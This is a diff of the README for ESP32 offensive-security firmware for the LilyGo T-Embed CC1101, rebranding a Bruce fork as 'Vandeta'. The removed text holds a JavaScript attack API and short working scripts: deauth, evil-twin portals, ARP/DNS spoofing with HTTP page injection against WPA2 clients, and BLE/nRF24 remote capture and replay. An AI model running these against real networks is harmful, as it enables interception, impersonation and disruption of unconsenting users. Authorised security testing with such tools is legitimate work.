@@ -1,383 +1,168 @@
-![Bruce-Modded on the LilyGo T-Embed CC1101](./media/pictures/bruce_banner.jpg)
+# Vandeta
 
-# Bruce-Modded — Dev 1.2
+**The only firmware you need for the LilyGo T-Embed CC1101.**
 
-**Stock Bruce, with the WiFi radio handed to JavaScript.**
+![Vandeta](media/pictures/vandeta_crown.png)
 
-Scriptable deauth & beacon-spam · raw 802.11 frame injection · promiscuous
-packet capture · captive-portal (evil-twin) engine · headless BLE spam · **ARP
-spoofing, DNS spoofing and HTTP interception that work on WPA2** · split scripts
-and background jobs — all driven from the on-device JavaScript interpreter.
+Vandeta is a **reskin of [Bruce](https://github.com/BruceDevices/firmware)** — the
+open-source ESP32 offensive-security firmware — built on **Bruce 1.16.1** and
+tuned for one board: the **LilyGo T-Embed CC1101**. It boots with the Vandeta
+crown and calls itself Vandeta in the menus, the web UI and on the console. The
+code underneath is Bruce's code: same architecture, same menus, same tools, same
+licence. Upstream credit and the AGPL-3.0 `LICENSE` are untouched, and the whole
+upstream feature list applies here too (it is reproduced further down).
 
-Built and tested on the **LilyGo T-Embed CC1101** (ESP32-S3, 16 MB flash /
-8 MB PSRAM).
-
-![firmware](https://img.shields.io/badge/firmware-Dev%201.2-blue)
-![board](https://img.shields.io/badge/board-LilyGo%20T--Embed%20CC1101-informational)
-![mcu](https://img.shields.io/badge/MCU-ESP32--S3-success)
-![license](https://img.shields.io/badge/license-AGPL--3.0-orange)
-
-[Flash it](#flashing-the-release-image) ·
-[What's new](#whats-new-in-dev-12) ·
-[JavaScript API](#javascript-api) ·
-[Build it](#building-from-source) ·
-[Limitations](#known-limitations)
+> **All credit for the firmware belongs to the Bruce project and its
+> contributors.** Vandeta changes branding and adds the tooling listed below; it
+> is not a fork that hides where it comes from.
 
 ---
 
-## What is this?
+## Why this exists
 
-Bruce-Modded is a fork of [Bruce](https://github.com/pr3y/Bruce) — the ESP32
-offensive-security firmware — with a scriptable WiFi/BLE attack engine added to
-its JavaScript interpreter.
+Bruce already runs on this board, but out of the box you have to be at the
+device to use most of it: the screen is small, the encoder is fiddly, and the
+interesting parts (capture, replay, scripted attacks, radio analysis) are hard to
+watch or automate from a laptop.
 
-Stock Bruce exposes its WiFi attacks as **menus you tap**. This mod exposes them
-as **functions a script calls**, adds a raw 802.11 transmit path, a promiscuous
-capture engine and a captive-portal engine, and then makes the interpreter safe
-against the JS engine's moving garbage collector.
-
-> **Status:** Dev 1.2, based on upstream `main` @ `a59213f3` (2026-09-24).
-> Only the LilyGo T-Embed CC1101 target is built and tested.
+Vandeta's goal is to be the **only firmware you need for the T-Embed CC1101**:
+everything Bruce does, plus a full **USB console** that can drive and inspect the
+device from a PC — screens, menus, files, radios, memory and JavaScript — with no
+WiFi, no reflash and no extra hardware.
 
 ---
 
-## What's new in Dev 1.2
+## What it adds on top of Bruce
 
-A scriptable debug console, three more of the board's radios exposed to
-JavaScript together with the on-device menus that go with them, a full BadUSB
-configuration menu, an extra set of WiFi attacks, and two fixes that hand back
-internal RAM and make a non-US keyboard layout actually type.
+* **Developer Options (USB console).** A persisted toggle that turns the USB
+  serial link into a real control surface: `ui` / `move` / `press` drive the menus
+  and print the screen you land on, `file` / `storage` / `md5` / `crc32` work on
+  the card, `mem` / `proc` / `sys` report the board, `errors` / `log show` dump
+  the error ring, `livepatch` reloads the JavaScript layer without a reflash and
+  `hotreload` re-runs a script when it changes on the card. It also speaks a
+  framed binary protocol for reliable transfers over the same cable.
+* **Packet Monitor.** One dashboard with a real capture ring fed by WiFi, BLE,
+  nRF24 and Sub-GHz, with filters, counters, CSV export and PCAP export.
+* **Frequency Analyzer.** A Flipper Zero style analyser for the CC1101 —
+  coarse hop, 20 kHz fine pass, held readout, hit log — drawn in the theme
+  colours.
+* **More radio work from JavaScript.** Raw nRF24 capture (including the five
+  documented 2.4 GHz LED-controller protocols, channel-lock capture and a repeat
+  finder), BLE advertisement capture/replay and a GATT client, plus
+  `wifi.captureStart()`/`getCapturedPackets()` and packet decoding.
+* **Attacks that work on protected networks.** ARP spoofing, DNS spoofing and
+  HTTP interception/modification against WPA2 clients, with a captive-portal
+  (evil-twin) engine and a headless, deadline-bounded WiFi attack set.
+* **BadUSB, scriptable.** Layouts, VID/PID, manufacturer/product strings and
+  payloads are settable from the console and from scripts.
+* **A wider JavaScript API** (WiFi inject/capture/portal, BLE, nRF24, IR, Sub-GHz,
+  display, storage, dialog, keyboard) with split scripts and background jobs.
 
-| # | Change | Detail |
-|---|--------|--------|
-| 16 | **Developer Options mode** | A console over USB-Serial-JTAG (Config → System Config → Developer Options): file and directory verbs, navigation, transfers, JS execution, an error stream, process/system info, command queueing and history. A framed binary protocol (`A5 5A`, CRC-16/CCITT) moves files byte-identically at ~18 KB/s and backs the host-side `tools/usb_debug.py` client |
-| 17 | **BadUSB configuration menu** | BadUSB gained a config menu: USB footprint (VID/PID, manufacturer, product, serial), keyboard layout selection, a built-in **Finland (fi-FI)** layout plus import/export/copy of custom layout files, HID device type (keyboard / composite / mouse), attack speed and string delay, and payload folder management |
-| 18 | **More Attacks** | WiFi → WiFi Atks → **More Attacks** (and Target Atks → **More Attacks**): EAPOL Logoff, Channel Switch, Bad Message, Auth Flood, Probe Request Flood, Authentication Attack, EAPOL Start Attack and Disassociation Attack, all deadline-bounded and stopped with Back, so they can run from a menu or the console. Beacon Flood is the existing beacon-spam engine |
-| 19 | **BLE: GATT client and capture/replay in JS** | `ble.init/setAddress/scan/scanDetailed/connect/disconnect/getService/getCharacteristic/read/write/notify/pollEvents` plus `ble.captureStart/captureStop/captureList/captureReplay/captureSave/captureLoad/captureAnalyze/setRemoteType`, backed by the same engine as the new **BLE → Capture & Replay** menu |
-| 20 | **NRF24: raw capture, analysis and replay in JS** | The full `nrf24.*` set, plus pseudo-promiscuous mode (CRC off, auto-ack off, minimum address width), `setPromiscuousMode`, `scanAllChannels`, `setFrequencyHopMode`, `captureRaw`, `captureMultiFreq`, `replayRaw`, `saveSignal`/`loadSignal`, `analyzeSignal`, `setFrequencyRange` and `detectMultiFreqSignals` |
-| 21 | **On-device capture menus** | NRF24 → **Raw Capture** (capture, hop capture, channel scan, multi-frequency detection, frequency analysis, list, save/load, replay, analyse) and BLE → **Capture & Replay** (start/stop, filter, save/load, replay, analyse, remote type, detailed scan), all over the same engines the scripts drive. Both show a live counter while they run, **only Back interrupts** a running capture (the screen says so) and Back returns to the previous menu |
-| 22 | **Apps** | The main menu's **JS Interpreter** entry is now **Apps**, with a new app-drawer icon to match the other menu icons. The page behind it (scripts, App Store, Load…) is unchanged, and a menu entry hidden under the old name stays hidden |
-| 23 | **BLE memory fix** | A BLE bring-up that failed left the controller initialised and enabled, keeping ~34 KB of internal RAM gone for the rest of the boot and making every later Wi-Fi/BLE attempt fail on RAM. It is now unwound on failure. The BLE memory guard also checked the wrong quantity — only the largest contiguous DMA block (15 KB) instead of the ~56 KB of internal DRAM a bring-up needs — so it refused nothing and reported nothing; it now checks both and says which one is short |
-| 24 | **BadUSB typing fix** | The keyboard-layout table had one entry fewer than the layout index range that can be selected and persisted, so the last layout handed HID a garbage table and typing stopped working entirely; there is now a real Finnish (Nordic) table and every index is clamped. A character the active layout cannot express (the Nordic dead keys) no longer throws away the rest of the payload |
-| 25 | **Script teardown** | `interpreter.cpp` also calls `ble_js_cleanup()`, stopping a background BLE capture and dropping the GATT client when a script ends |
-| 26 | **Boot version** | The splash screen now reads **Bruce / dev 1.2** |
-
----
-
-## What's new in Dev 1.1
-
-### Protected networks, at last
-
-Dev 1.0 could only forge frames onto open networks — a WPA2 client drops a data
-frame it cannot verify with its pairwise key. Dev 1.1 sends its frames on the
-**associated station interface** instead, so the hardware encrypts them with the
-association key on the way out. That is the same path Bruce's own NetCut menu
-already used, and it is what makes the interception below work on WPA2/WPA3.
-
-| # | Change | Detail |
-|---|--------|--------|
-| 11 | **ARP spoofing** | `arpSpoof.*` — two-way poison pairs re-sent every 250 ms by a service task, plus ARP-scan target discovery |
-| 12 | **DNS spoofing** | `dnsSpoof.*` — a rule table matched against intercepted UDP/53 A-record queries and answered from the board with the client's own transaction id and ports |
-| 13 | **HTTP interception** | `httpInterceptor.*` — captures plain-HTTP requests (ports 80/8080) and answers them with a forged 302 or an injected page; `getInterceptedData()` returns the request ring |
-| 14 | **Script folders and background scripts** | `scriptFolder.*` — create/list/load/run/close, split a script into parts that share globals, run jobs in their own context and FreeRTOS task (`stop`/`kill`), plus a string shared store |
-| 15 | **Boot version** | The splash screen now reads **Bruce / dev 1.1** |
-
-Verified on the device against a real client on a real WPA2/WPA3 network: the
-board joined the network as a station, poisoned the target, answered its DNS
-lookups from the board and replaced its plain-HTTP pages — the target's browser
-rendered the forged page.
-
-> The interception is **not** transparent. The ESP32 cannot forward or NAT, so a
-> poisoned target loses its real internet path while the attack runs, and only
-traffic that ends at this board can be intercepted. Read
-> [known limitations](#known-limitations) first.
-
-## What's new in Dev 1.0
-
-### Firmware engine
-
-| # | Change | Detail |
-|---|--------|--------|
-| 1 | **Headless WiFi attacks** | `wifi_atks` gained a deadline-bounded API (`wifi_atk_setWifi()`, `wifi_atk_unsetWifi()`, `wifi_complete_cleanup()`, `headlessBeaconSpam()`) so a script can run an attack with no button presses and no UI blocking |
-| 2 | **Raw 802.11 injection** | `wifi_raw_inject()` transmits arbitrary frames with `esp_wifi_80211_tx()`, the AP callback bypassed, auto-selecting the STA/AP interface, with repeat, inter-frame gap and CRC32 FCS options |
-| 3 | **Promiscuous capture** | PSRAM-backed capture engine: 2 session slots, 100 packets / 50 KB per session, self-reaping deadlines |
-| 4 | **Captive portal / evil twin** | `wifi_portal_run()` brings up an open AP, hijacks DNS, answers captive-portal probe paths with a 302 and can deauth the real AP |
-| 5 | **Application-layer builders** | Real IPv4 + UDP/TCP checksums (`wifi_build_dns_response()`, `wifi_inject_udp()`, `wifi_inject_tcp()`) and frame parsers (`wifi_parse_frame()`, `wifi_parse_ipv4()`) |
-| 6 | **Headless BLE spam** | `ble_spam` exposes the same advertisement builders as the on-screen menu, deadline-bounded |
-| 7 | **Interpreter GC safety** | The JS engine (`mquickjs`) has a *compacting, moving* collector that never scans the C stack, so every binding that builds an array or object now pins its intermediates in `JSGCRef` and re-reads them after each allocating call — 15 interpreter modules hardened |
-| 8 | **Script lifecycle** | `interpreter.cpp` calls `wifi_js_cleanup()` on exit, so a script cannot leak radio state into the next one |
-| 9 | **Boot version** | The splash screen now reads **Bruce / Dev 1.0** |
-| 10 | **Release build** | `build.py` also emits `Bruce-modded.bin`, one merged image for a single `write_flash` |
-
-### New script bindings
-
-17 new WiFi bindings, 2 BLE bindings and 5 misc helpers, on top of everything
-stock Bruce already exposed. Signatures: [JavaScript API](#javascript-api).
+Everything else — the menus, the apps, the Sub-GHz/IR/RFID/NFC tooling, the
+upstream script ecosystem — is Bruce, unchanged.
 
 ---
 
-## Flashing the release image
+## Hardware
 
-**Download:** the prebuilt image is attached to the
-[**Dev 1.2 release**](https://github.com/Axagt40/Bruce-Modded/releases/tag/dev-1.2)
-(`Bruce-modded.bin` — 4,489,696 bytes, sha256 `dfa1b36d…5ce6d` — plus its
-`.sha256`) and is also committed at the repository root. The older images stay
-available on the [Dev 1.1 release](https://github.com/Axagt40/Bruce-Modded/releases/tag/dev-1.1)
-and the [Dev 1.0 release](https://github.com/Axagt40/Bruce-Modded/releases/tag/dev-1.0).
+| | |
+|---|---|
+| Board | **LilyGo T-Embed CC1101** ("T-Embed C1011 plus") |
+| MCU | ESP32-S3, 16 MB flash, 8 MB PSRAM |
+| Display | 320x170 landscape, encoder navigation |
+| Radios | CC1101 Sub-GHz, nRF24 socket, WiFi, BLE |
+| Notes | Runs on battery; the CC1101 and nRF24 are not simultaneous |
 
-The image is **merged** (bootloader + partition table + app) and **must be
-flashed at offset `0x0`**.
+---
+
+## Installing
+
+The image is **pre-merged** (bootloader + partition table + app), so it is one
+`write_flash` at offset **`0x0`**. Download it from the
+[latest release](https://github.com/Axagt40/Vandeta/releases/latest) —
+`vandeta.bin` — together with `vandeta.bin.sha256`.
 
 ```sh
-sha256sum -c Bruce-modded.bin.sha256
+# 1. verify the download
+sha256sum -c vandeta.bin.sha256
+
+# 2. flash it (board in console mode: lsusb shows 303a:1001)
 esptool.py --chip esp32s3 --port /dev/ttyACM0 --baud 921600 \
-    write_flash 0x0 Bruce-modded.bin
+    write_flash 0x0 vandeta.bin
 ```
 
-* Replace `/dev/ttyACM0` with your port (`COM5` on Windows).
-* The board exposes USB-Serial-JTAG while it is in console mode (`lsusb` →
-  `303a:1001`). If no port appears, it is in **Mass Storage** mode
-  (`303a:0002`) — exit that feature on the device and re-plug. No host command
-  can switch it for you.
-* Clean install (wipes saved config and LittleFS):
-  `esptool.py ... erase_flash` first, then flash.
-* Flashing at any offset other than `0x0` leaves bootloader and partition table
-  mismatched and the board will not boot.
-* To go back to stock Bruce or a Launcher install, flash that project's merged
-  image at `0x0` the same way, after an `erase_flash`.
+* **Wrong offset bricks the boot** — the merged image always goes to `0x0`.
+* Windows: replace the port with `COM5` (or whatever Device Manager shows).
+* No `/dev/ttyACM0` on Linux, but `lsusb` shows `303a:1001`? The `cdc_acm`
+  driver is not loaded: `sudo modprobe cdc_acm`.
+* `303a:0002` instead of `303a:1001` means the board is in USB Mass Storage mode.
+  Leave it on the device before flashing.
+* Clean install (wipes saved settings): `esptool.py ... erase_flash` first.
+* Flashing this image does **not** touch the SD card.
 
-First boot shows **Bruce** with **dev 1.2** underneath.
+On first boot the splash shows **Vandeta**, then **vandeta 1.0**, then the crown
+drawn in your UI colour (Settings → Display & UI → UI Colour).
 
 ---
 
-## JavaScript API
+## Using it from a PC
 
-The engine is `mquickjs`, so scripts are **plain ES5**: no `let`/`const`, no
-arrow functions, no template literals, no destructuring, no classes, no promises.
+Turn on **Config → System Config → Developer Options**, then talk to the board
+over the same USB cable:
 
-```js
-var wifi = require("wifi");
-
-// 1. Attack from a script - no menus involved
-wifi.deauth("AA:BB:CC:DD:EE:FF", 6, 10);     // bssid, channel, seconds
-wifi.beaconSpam(4, 30, "FreeWiFi");          // 4 = counter SSID, 30 seconds
-
-// 2. Listen promiscuously, then read the frames back
-var id = wifi.captureStart(6, 15000);        // channel, timeoutMs -> session id
-var pkts = wifi.getCapturedPackets(id, 100); // [{timestamp, channel, rssi, data}, ...]
-var info = wifi.packetInfo(pkts[0].data);    // decode one frame
-
-// 3. Transmit a hand-built frame
-wifi.injectPacket("80000000ffffffffffffaabbccddeeffaabbccddeeff0000", 6);
+```sh
+# what is on the screen right now
+ui
+# press a key and read the screen you land on
+ui down
+ui select
+# card and system
+ls /                   storage free sd        mem        sys
+file read /bruce.conf  md5 /bruce.conf         errors     proc
+# script layer, live
+js run /BruceJS/yourscript.js
+livepatch apply hello console.log('hi')
 ```
 
-| Binding | Returns |
-|---------|---------|
-| `wifi.deauth(bssid, channel?, seconds?)` | `number` |
-| `wifi.deauthAll(seconds?, channel?)` | `number` |
-| `wifi.beaconSpam(mode?, seconds?, ssid?)` | `number` (mode 4 = counter SSID) |
-| `wifi.sniffHandshake(bssid, channel?, seconds?, ssid?)` | `object` (writes a pcap) |
-| `wifi.injectPacket(hex, channel?)` | `boolean` |
-| `wifi.sendRaw80211(hex, channel?, options?)` | `object` |
-| `wifi.captureStart(channel?, timeoutMs?)` / `wifi.captureStop(id)` | `number` / `boolean` |
-| `wifi.getCapturedPackets(id, maxPackets?)` | `array` |
-| `wifi.setPromiscuous(enable, channel?)` | `boolean` |
-| `wifi.portal(ssid, channel?, options?)` | `object` |
-| `wifi.packetInfo(hex)` | `object` |
-| `wifi.injectDns(...)` `wifi.injectHttp(...)` `wifi.injectHttpRedirect(...)` `wifi.injectHtml(...)` | `object` |
-| `arpSpoof.start(targetIP, gatewayIP?)` / `stop()` / `getStatus()` / `getTargets(rescan?)` | `object` |
-| `dnsSpoof.start(domain, ip)` / `startAll(pattern, ip)` / `stop()` / `getStatus()` / `clearRules()` | `object` |
-| `httpInterceptor.start()` / `stop()` / `addRedirect(pattern, url)` / `addInjection(pattern, html)` / `clearRules()` / `getInterceptedData(clear?)` | `object` |
-| `scriptFolder.create/list/load/run/close/isRunning/getAllScripts/stop/kill` + `setShared/getShared/clearShared` | `object` |
-| `ble.spam(type?, seconds?)` / `ble.spamModes()` | `number` / `array` |
-| `ble.init(name?)` / `ble.address()` / `ble.setAddress(addr, type?)` | `boolean` / `string` / `boolean` |
-| `ble.scan(seconds?)` / `ble.scanDetailed(seconds?, max?)` | `array` |
-| `ble.connect(addr, timeoutMs?, addrType?)` / `ble.disconnect()` / `ble.isConnected()` | `boolean` |
-| `ble.services()` / `ble.getService(uuid)` / `ble.characteristics(service)` / `ble.getCharacteristic(service, uuid)` | `array` / `number` |
-| `ble.read(charIndex, asText?)` / `ble.write(charIndex, data, asText?, withResponse?)` | `string` / `boolean` |
-| `ble.notify(charIndex, enable?, callback?)` / `ble.pollEvents()` | `boolean` / `number` |
-| `ble.captureStart(maxSeconds?)` / `ble.captureStop()` / `ble.captureRunning()` / `ble.captureCount()` / `ble.captureClear()` | `boolean` / `number` |
-| `ble.captureList(filter?, max?)` / `ble.captureAnalyze(index?)` | `array` / `object` |
-| `ble.captureReplay(seconds?, spoofAddress?)` / `ble.captureSave(name, label?)` / `ble.captureLoad(name)` | `boolean` / `number` |
-| `ble.remoteTypes()` / `ble.setRemoteType(index or name)` | `array` / `number` |
-| `nrf24.init()` / `setChannel(ch)` / `setDataRate(rate)` / `setPowerLevel(level)` / `setAddress(hex)` | `boolean` |
-| `nrf24.startListening()` / `stopListening()` / `available()` / `read()` / `send(data)` / `receive(timeoutMs?)` | `boolean` / `string` |
-| `nrf24.setPromiscuousMode(enable)` / `setFrequencyHopMode(enable)` / `setFrequencyRange(startMhz, endMhz)` | `boolean` |
-| `nrf24.scanAllChannels(dwellMs?)` / `captureRaw(ms)` / `captureMultiFreq(ms)` / `loadSignal(name)` | `array` |
-| `nrf24.replayRaw(data, channel?, repeat?)` / `saveSignal(name, data)` | `boolean` |
-| `nrf24.analyzeSignal(data)` / `detectMultiFreqSignals(ms?)` | `object` |
-| `ir.transmitRaw(frequency, rawData)` | `boolean` |
-| `subghz.scan(startFreq?, stopFreq?, maxLoops?)` | `string` |
-| `serial.available()` / `serial.read(maxBytes?, timeoutMs?)` | `number` / `string` |
-| `storage.exists(path)` / `storage.size(path)` / `storage.copy(src, dest, overwrite?)` | `boolean` / `number` / `boolean` |
-
-`test.js` in the repository root is a smoke test for the raw-injection and
-capture bindings: it prints one `PASS`/`FAIL` line per binding to the serial
-console, and its header doubles as a worked example.
-
-### Intercepting a client on a WPA2/WPA3 network
-
-```js
-wifi.connect("MyNetwork", 20, "password");
-arpSpoof.start("192.168.1.50");                 // two-way poison, re-sent every 250 ms
-dnsSpoof.startAll("*", wifi.getIPAddress());    // answer every lookup with this board
-httpInterceptor.addInjection("*", "<h1>Intercepted</h1>");
-httpInterceptor.start();
-delay(60000);                                   // the browse window
-httpInterceptor.stop(); dnsSpoof.stop(); arpSpoof.stop();
-```
-
-The client has to reach *this* board for there to be anything to answer: the
-poisoned DNS answer is what points it here, and something must be listening on
-the port it uses — start Bruce's own web UI from the serial console with `webui`
-while the script runs. Plain HTTP only: a browser that upgrades an `http://`
-address to HTTPS fails (there is no TLS listener), and a client with Private DNS
-(DoT) on never reaches the spoofer at all.
-
-### Cloning a BLE or 2.4 GHz remote
-
-Both radios are scriptable, and the scripts share their capture state with the
-**BLE → Capture & Replay** and **NRF24 → Raw Capture** menus, so a capture taken
-on screen can be replayed from a script and the other way round.
-
-```js
-// BLE: record the advertisements a remote broadcasts, then replay them.
-ble.captureStart(5);                       // background scan, up to 5 seconds
-while (ble.captureRunning()) { delay(250); }
-var pkts = ble.captureList("", 10);        // [{index, description, address, hex, ...}]
-console.log(pkts.length + " adverts, first " + pkts[0].hex);
-ble.captureSave("living_room", "ble");
-ble.captureReplay(3, true);                // 3 s, spoof the original address
-
-// NRF24: pseudo-promiscuous capture of a 2.4 GHz remote on two frequencies.
-nrf24.init();
-nrf24.setPromiscuousMode(true);
-nrf24.setFrequencyRange(2400, 2483);
-nrf24.setFrequencyHopMode(true);
-var hits = nrf24.captureRaw(3000);
-if (hits.length > 0) {
-    var a = nrf24.analyzeSignal(hits[0].data);
-    console.log(a.kind + " len=" + a.len + " repeats=" + a.repeats);
-    nrf24.saveSignal("remote_btn_a", hits[0].data);
-    nrf24.replayRaw(hits[0].data, hits[0].channel, 3);
-}
-```
-
-A GATT connection works the same way as the phone apps: scan, connect with the
-`addrType` the scan reported (most devices are random, not public), then walk
-services and characteristics.
-
-```js
-var dev = ble.scanDetailed(4, 10);
-for (var i = 0; i < dev.length; i++) {
-    if (dev[i].name.indexOf("MyDevice") != -1) {
-        ble.connect(dev[i].address, 5000, dev[i].addrType);
-        var ch = ble.getCharacteristic("2a19");        // battery level
-        console.log("battery " + parseInt(ble.read(ch), 16));
-        ble.disconnect();
-    }
-}
-```
-
-> `nrf24.captureRaw()` and `ble.captureStart()` block or run in the background
-> respectively; both need the radio, so do not run a capture while another radio
-> feature is active. See [known limitations](#known-limitations).
-
-### Running a script
-
-Put the script on the SD card under `/scripts`, `/BruceScripts` or `/BruceJS`
-(LittleFS works as a fallback), then open **Apps** in the main menu, or load
-it from another script:
-
-```js
-load('/BruceJS/myscript.js')
-```
-
----
-
-## Known limitations
-
-These are properties of the radio, the board or the engine - not bugs waiting to
-be fixed. Read them before filing an issue.
-
-* **Application-layer injection only lands on OPEN / WEP networks.** On
-  WPA2/WPA3 the client's radio requires the frame to be encrypted with its
-  pairwise key, so a forged plaintext data frame is dropped at the radio.
-  Dev 1.1's `arpSpoof`/`dnsSpoof`/`httpInterceptor` are the exception: they
-  transmit on the associated station interface, so they work on WPA2/WPA3.
-* **The interception cannot forward.** A poisoned target loses its real path to
-  the internet while the attack runs - its traffic arrives at the board and is
-  answered (or dropped) there. There is no NAT and no relaying.
-* **Only traffic that ends at the board can be intercepted.** There is no TCP
-  handshake handling and no routing, so a request to any other address is
-  dropped unanswered and the client never sends anything to intercept. Poison
-  the pair, answer DNS with the board's own address, and keep a listener on the
-  port the client uses (Bruce's web UI on port 80 is enough).
-* **Plain HTTP only** (ports 80/8080) and **DNS A records over UDP/53 only**. A
-  client using Private DNS (DoT/DoH) bypasses the DNS spoofer completely, and a
-  browser that upgrades `http://` to HTTPS shows nothing — test with an
-  IP-literal `http://` URL to see the injection.
-* **The interception lives inside a single script run**: the engine is torn down
-  and the ARP tables restored when the script ends.
-* **An injected page must fit one ethernet frame** (roughly 1300 bytes of body);
-  longer content is trimmed so `Content-Length` stays truthful.
-* **Forged TCP/DNS must match the live conversation** (ports, TCP seq/ack, DNS
-  transaction id) or the victim's stack discards it silently. Capture →
-  `wifi.packetInfo()` → inject with the captured values.
-* **The evil twin has no uplink** (the ESP32 cannot NAT), so every DNS name
-  resolves back to the device and portal pages must be self-contained.
-* **The twin AP is open**, so devices holding a saved WPA2 profile for the same
-  SSID usually will not auto-join it.
-* **`storage.copy` is unreliable for file-to-file copies** - it treats the
-  destination as a directory. Use `storage.read()` + `storage.write()`.
-* **No FreeFont is loaded**, so the panel font is ASCII only - emoji render as
-  boxes.
-* **The panel is 320x170 landscape**, so lay out from `display.width()` /
-  `display.height()` rather than hardcoded geometry.
-* **Pseudo-promiscuous nRF24 receive is not true promiscuous mode.** The
-  nRF24L01 filters by address in hardware: `setPromiscuousMode(true)` disables
-  the CRC and shortens the address to three bytes, which catches most 2.4 GHz
-  traffic and a lot of noise, but a packet whose leading address bytes differ is
-  still dropped by the chip.
-* **A 2.4 GHz capture is not a demodulation.** `captureRaw` stores the on-air
-  bytes; a remote that transmits at 250 kbps or uses a proprietary framing may
-  capture as noise. Try the data rates in `nrf24.setDataRate()` before replaying.
-* **Only one radio feature at a time.** nRF24, BLE and WiFi share the antenna and
-  their own SPI buses; a capture while another radio is running gives garbage.
-* **BLE replay is an advertisement replay.** It re-broadcasts the recorded
-  advertisement bytes (and can spoof the address), which is what vendor remotes
-  respond to. It cannot inject into an existing GATT connection.
-* **`ble.connect()` needs the right address type.** Modern devices use a random
-  address; pass the `addrType` that `ble.scan()`/`ble.scanDetailed()` reported or
-  the connection is attempted against the wrong address and fails.
-* **GATT calls block the script** while the peer answers, and a background
-  `ble.captureStart()` still owns the radio until `ble.captureStop()` returns.
-* **Long native calls block the script** - the UI freezes until they return.
+The console boots in plain text and only switches modes when asked, so a
+mis-typed command can never leave the board in an unusable state.
 
 ---
 
 ## Building from source
 
-Requires PlatformIO Core 6.1.19+ and python3. The first build needs network
-access to resolve `lib_deps` (Arduino-ESP32 3.3.9, pioarduino platform 55.03.39,
-toolchain-xtensa-esp-elf 14.2.0); everything is cached under `.pio/` afterwards.
+PlatformIO Core 6.1.19+ and python3; the first build needs network access to
+resolve `lib_deps` (Arduino-ESP32 3.3.9, pioarduino platform 55.03.39,
+toolchain-xtensa-esp-elf 14.2.0), cached under `.pio/` afterwards.
 
 ```sh
 pio run -e lilygo-t-embed-cc1101
 ```
 
-This produces `Bruce-lilygo-t-embed-cc1101.bin` and a merged copy named
-`Bruce-modded.bin` in the project root (a `build.py` post-action runs
-`esptool merge-bin`). Because `BRUCE_VERSION` is a `build_flags` define,
-changing it invalidates the whole build cache - expect a ~15-25 minute rebuild.
+This produces `vandeta-lilygo-t-embed-cc1101.bin` and a merged copy named
+`vandeta.bin` in the project root (`build.py` runs `esptool merge-bin` as a
+post-action). `BRUCE_VERSION` is a `build_flags` define, so changing it
+invalidates the build cache — expect a 15-25 minute rebuild.
+
+---
+
+## Credits and licence
+
+* **Bruce** — <https://github.com/BruceDevices/firmware> (upstream:
+  <https://github.com/pr3y/Bruce>). Vandeta is a reskin of Bruce 1.16.1; the
+  firmware is Bruce's work and the whole upstream feature list, device support
+  and documentation further down this file are its authors'.
+* Licence: **AGPL-3.0** (`LICENSE`), third-party notices in `THIRD_PARTY.md`.
+  Both are unchanged from upstream and both apply to this build.
 
 ---
 
 ## About the upstream project
 
-Everything below this line is the upstream Bruce project - feature list,
-supported devices, credits and license. Bruce-Modded is a derivative work and
-keeps all of it intact.
+Everything below this line is the upstream Bruce project — feature list,
+supported devices, credits and license — kept intact on purpose.
+
+---
 
 ---
 
@@ -443,7 +228,7 @@ Also, [read our FAQ](https://wiki.bruce.computer/faq/)
     - [x] Target Deauth
     - [x] EvilPortal + Deauth
   - [x] Deauth Flood (More than one target)
-  - [x] Additional attacks (menu page: "More Attacks")
+  - [x] Additional attacks (in the flat **Wifi Atks** menu)
     - [x] EAPOL Logoff
     - [x] Channel Switch
     - [x] Bad Message
